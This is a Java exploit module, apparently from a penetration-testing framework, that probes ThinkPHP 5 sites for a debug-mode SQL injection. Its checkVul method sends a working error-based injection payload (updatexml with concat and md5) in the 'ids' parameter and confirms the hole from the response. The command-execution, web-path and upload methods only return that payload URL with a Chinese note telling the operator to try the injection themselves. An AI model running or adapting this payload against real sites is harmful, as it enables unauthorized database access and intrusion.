package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_debug_index_ids_sqli implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        url = url + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1";
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.get(url, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("cf67355a3333e6e143439161adc2d82")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        return "这是一个sql注入漏洞，请自行尝试\r\n" + this.target + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1";
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        return "这是一个sql注入漏洞，请自行尝试\r\n" + this.target + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1";

    }

    @Override
    public String uploadFile(String fileContent, String fileName, String platform) throws Exception {
        return "这是一个sql注入漏洞，请自行尝试\r\n" + this.target + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1";

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
